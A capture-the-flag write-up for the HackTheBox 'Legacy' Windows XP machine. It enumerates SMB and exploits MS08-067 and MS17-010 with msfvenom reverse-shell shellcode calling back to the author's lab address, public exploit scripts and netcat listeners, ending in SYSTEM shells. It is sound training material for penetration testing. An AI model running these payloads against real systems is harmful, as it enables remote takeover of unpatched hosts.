---
title: HTB: Legacy
url: https://0xdf.gitlab.io/2019/02/21/htb-legacy.html
date: 2019-02-21T13:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-legacy, windows, ms08-067, ms17-010, smb, msfvenom, xp, oscp-like-v1
---

![legacy-cover](https://0xdfimages.gitlab.io/img/legacy-cover.png)

Since I’m caught up on all the live boxes, challenges, and labs, I’ve started looking back at retired boxes from before I joined HTB. The top of the list was legacy, a box that seems like it was one of the first released on HTB. It’s a very easy Windows box, vulnerable to two SMB bugs that are easily exploited with Metasploit. I’ll show how to exploit both of them without Metasploit, generating shellcode and payloads with msfvenom, and modifying public scripts to get shells. In beyond root, I’ll take a quick look at the lack of whoami on XP systems.

## Box Info

| Name | [legacy](https://hackthebox.com/machines/legacy)  [legacy](https://hackthebox.com/machines/legacy) [Play on HackTheBox](https://hackthebox.com/machines/legacy) |
| --- | --- |
| Release Date | 15 Mar 2017 |
| Retire Date | 26 May 2017 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for legacy |
| Radar Graph | Radar chart for legacy |
| First Blood User | 18 days17:04:44[0x1Nj3cT0R 0x1Nj3cT0R](https://app.hackthebox.com/users/22) |
| First Blood Root | 18 days17:02:21[0x1Nj3cT0R 0x1Nj3cT0R](https://app.hackthebox.com/users/22) |
| Creator | [ch4p ch4p](https://app.hackthebox.com/users/1) |

## Recon

### nmap

`nmap` shows just remote desktop (3389), and the SMB/NetBios ports (TCP 139, 445 and UDP 137):

```

root@kali# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-18 20:30 EST                   
Nmap scan report for 10.10.10.4                                
Host is up (0.018s latency).
Not shown: 65532 filtered ports                                                                   
PORT     STATE  SERVICE                                        
139/tcp  open   netbios-ssn    
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server
                                       
Nmap done: 1 IP address (1 host up) scanned in 13.43 seconds

root@kali# nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-18 20:34 EST
Nmap scan report for 10.10.10.4                               
Host is up (0.019s latency).
Not shown: 65534 open|filtered ports
PORT    STATE SERVICE                                                
137/udp open  netbios-ns                                                                        
                   
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds

root@kali# nmap -sC -sV -p 139,445 -oA nmap/scripts 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-19 13:37 EST
Nmap scan report for 10.10.10.4
Host is up (0.019s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -4h08m26s, deviation: 1h24m51s, median: -5h08m26s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b2:7b:09 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2019-02-19T17:29:16+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 257.42 seconds

```

### SMB

#### Null Auth

Neither `smbmap` nor `smbclient` show any ability to log in without authentication:

```

root@kali# smbmap -H 10.10.10.4
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.4...
[+] IP: 10.10.10.4:445  Name: 10.10.10.4
        Disk                                                    Permissions
        ----                                                    -----------
[!] Access Denied

root@kali# smbclient -N -L //10.10.10.4
session setup failed: NT_STATUS_INVALID_PARAMETER

```

#### Vulnerabilities

I’ll use the `nmap` scripts to check for vulnerabilities. Given that this is an XP host, it seems likely that there will be some.

I can see a list of these scripts by looking at the files in the `nmap` scripts directory:

```

root@kali# ls /usr/share/nmap/scripts/ | grep smb | grep vuln
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse

```

I can run then as follows:

```

root@kali# nmap --script smb-vuln* -p 445 -oA nmap/smb_vulns 10.10.10.4
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-19 13:27 EST
Nmap scan report for 10.10.10.4
Host is up (0.018s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067:
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 5.49 seconds

```

It looks like this box is vulnerable to two infamous SMB exploits, MS-08-067 (made famous by Conficker) and MS-17-010 (made famous by Shadow Brokers).

## System Shell

### Overview

Both of these vulnerabilities give a shell as system. Both also have Metasploit modules that are basically automatic pwns. But to make this interesting (and relevant to anyone doing PWK / OSCP), I’ll show how to do each without Metasploit.

### MS-08-067

#### Locate Exploit

I’ll use the exploit from jivoi on Github [here](https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py). It’s a python script that requires Impacket (which comes installed on Kali) and for me to replace the default shellcode with some of my own. (Interestingly, the default is a reverse TCP shell to 10.11.0.157… looks like the author may have been in PWK.)

#### Shellcode Generation

To make the shellcode, I’ll use `msfvenom`. I’ll copy the bad characters list (`-b`) from the examples in the exploit code. I’ll use the following parameters:
- `-p windows/shell_reverse_tcp` - This will connect back to me with a shell. Because I used `shell_reverse_tcp` it is unstaged, meaning the entire shell is in this code, and I can catch the callback with `nc`. Had I used `shell/reverse_tcp`, that would be a staged payload, and I’d need to use Metasploits `exploit/multi/handler` to get the callback.
- `LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread` - defining the variables for the payload - my ip, the port, and how to exit.
- `-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"` - The bad characters not to use. I got this from the comments in the python code.
- `-f py` - Output in python format. The examples use c format, and just pasted it in slightly differently. Either will work.
- `-v shellcode` - Have the code set the variable `shellcode`, instead of the default, `buf`. I want this to match what it’s called in the code I’m using.
- `-a x86` and `--platform windows` - Describing the environment I’m attacking.

```

root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of py file: 1872 bytes
shellcode =  ""
shellcode += "\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += "\x81\x76\x0e\x92\xab\xaa\xc8\x83\xee\xfc\xe2\xf4"
shellcode += "\x6e\x43\x28\xc8\x92\xab\xca\x41\x77\x9a\x6a\xac"
shellcode += "\x19\xfb\x9a\x43\xc0\xa7\x21\x9a\x86\x20\xd8\xe0"
shellcode += "\x9d\x1c\xe0\xee\xa3\x54\x06\xf4\xf3\xd7\xa8\xe4"
shellcode += "\xb2\x6a\x65\xc5\x93\x6c\x48\x3a\xc0\xfc\x21\x9a"
shellcode += "\x82\x20\xe0\xf4\x19\xe7\xbb\xb0\x71\xe3\xab\x19"
shellcode += "\xc3\x20\xf3\xe8\x93\x78\x21\x81\x8a\x48\x90\x81"
shellcode += "\x19\x9f\x21\xc9\x44\x9a\x55\x64\x53\x64\xa7\xc9"
shellcode += "\x55\x93\x4a\xbd\x64\xa8\xd7\x30\xa9\xd6\x8e\xbd"
shellcode += "\x76\xf3\x21\x90\xb6\xaa\x79\xae\x19\xa7\xe1\x43"
shellcode += "\xca\xb7\xab\x1b\x19\xaf\x21\xc9\x42\x22\xee\xec"
shellcode += "\xb6\xf0\xf1\xa9\xcb\xf1\xfb\x37\x72\xf4\xf5\x92"
shellcode += "\x19\xb9\x41\x45\xcf\xc3\x99\xfa\x92\xab\xc2\xbf"
shellcode += "\xe1\x99\xf5\x9c\xfa\xe7\xdd\xee\x95\x54\x7f\x70"
shellcode += "\x02\xaa\xaa\xc8\xbb\x6f\xfe\x98\xfa\x82\x2a\xa3"
shellcode += "\x92\x54\x7f\x98\xc2\xfb\xfa\x88\xc2\xeb\xfa\xa0"
shellcode += "\x78\xa4\x75\x28\x6d\x7e\x3d\xa2\x97\xc3\xa0\xc2"
shellcode += "\x9c\xa5\xc2\xca\x92\xaa\x11\x41\x74\xc1\xba\x9e"
shellcode += "\xc5\xc3\x33\x6d\xe6\xca\x55\x1d\x17\x6b\xde\xc4"
shellcode += "\x6d\xe5\xa2\xbd\x7e\xc3\x5a\x7d\x30\xfd\x55\x1d"
shellcode += "\xfa\xc8\xc7\xac\x92\x22\x49\x9f\xc5\xfc\x9b\x3e"
shellcode += "\xf8\xb9\xf3\x9e\x70\x56\xcc\x0f\xd6\x8f\x96\xc9"
shellcode += "\x93\x26\xee\xec\x82\x6d\xaa\x8c\xc6\xfb\xfc\x9e"
shellcode += "\xc4\xed\xfc\x86\xc4\xfd\xf9\x9e\xfa\xd2\x66\xf7"
shellcode += "\x14\x54\x7f\x41\x72\xe5\xfc\x8e\x6d\x9b\xc2\xc0"
shellcode += "\x15\xb6\xca\x37\x47\x10\x4a\xd5\xb8\xa1\xc2\x6e"
shellcode += "\x07\x16\x37\x37\x47\x97\xac\xb4\x98\x2b\x51\x28"
shellcode += "\xe7\xae\x11\x8f\x81\xd9\xc5\xa2\x92\xf8\x55\x1d"

```

I’ll take this shellcode into the script, and paste it in replacing the default. I like to also paste in a comment above it with the `msfvenom` command string I ran to generate it so that when I come back to it someday, I’ll know what it’s doing.

#### Guess Version

The exploit requires that I know the version of Windows and the Language pack:

```

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

```

The exploit takes advantage of knowing where some little bits of code will be in memory, and uses those bits on the path to shell. For different version of Windows, the addresses of those gadgets will be different. For example, from the source:

```

        elif (self.os == '4'):
            print 'Windows 2003 SP1 English\n'
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)

```

Based on my enumeration, I know it’s Windows XP. I’m going to try target 6 first, Windows XP SP3 English (NX). If that fails, I’ll come back and try others.

#### Run Exploit

I’ll open a `nc` listener, and run the exploit:

```

root@kali# python ms08-067.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer
#   - Added support for selecting a target port at the command line.
#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode.
#######################################################################

$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish

```

As it’s running, I get a callback on my listener:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1028.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```

And from there I can get both flags:

```

C:\Documents and Settings\john\Desktop>type user.txt
e69af0e4...

C:\Documents and Settings\Administrator\Desktop>type root.txt
993442d2...

```

### MS-17-010

#### Locate Exploit

There’s a few GitHubs out there with MS-17-010 code, but not as many that work on XP. My favorite is a fork of [worawit’s MS17-010 repo](https://github.com/worawit/MS17-010) by [helviojunior](https://github.com/helviojunior/MS17-010). He added a `send_and_execute.py`, which I can give an executable and it will upload and run it.

I’ll grab a copy of the script:

```

root@kali# wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
--2019-02-19 14:05:59--  https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.248.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.248.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43783 (43K) [text/plain]
Saving to: ‘send_and_execute.py’

send_and_execute.py                                         100%[========================================================================================================================================>]  42.76K  --.-KB/s    in 0.01s   

2019-02-19 14:05:59 (3.19 MB/s) - ‘send_and_execute.py’ saved [43783/43783]

```

#### Generate Payload

I’ll use `msfvenom` again. This time, I don’t need to worry about bad characters or variable names, as I can use an exe:

```

root@kali# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_10.10.14.14_443.exe
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev_10.10.14.14_443.exe

```

#### Run Exploit

Now I’ll start a listener, and then run the exploit:

```

root@kali# python send_and_execute.py 10.10.10.4 rev_10.10.14.14_443.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82246bb8
SESSION: 0xe10f9408
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1b1df10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b1dfb0
overwriting token UserAndGroups
Sending file N0KFUJ.exe...
Opening SVCManager on 10.10.10.4.....
Creating service TMkY.....
Starting service TMkY.....
The NETBIOS connection with the remote host timed out.
Removing service TMkY.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done

```

And I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1029.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>

```

## Beyond Root - Whoami

XP doesn’t have a `whoami` binary or command! So while I suspected that I was system with both of these exploits, how would I know:

```

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

```

For most users, I can use `echo` and the `%username%` environment variable:

```

C:\WINDOWS\system32>echo %username%
%username%

```

The fact that that environment variable doesn’t expand is a good sign that I’m system. If I want to go further, I can use `whoami.exe`, which is already on kali by default:

```

root@kali# locate whoami.exe
/usr/share/windows-binaries/whoami.exe

```

I’ll just share that folder over SMB with the command:

```

root@kali# smbserver.py a /usr/share/windows-binaries/
Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Now I’ll run it and see I’m system:

```

C:\WINDOWS\system32>\\10.10.14.14\a\whoami.exe
NT AUTHORITY\SYSTEM

```

Of course there are other ways I could check, like having access to write in certain places (`system32` for example). Getting `whoami.exe` is certainly one of the easiest and most definitive methods.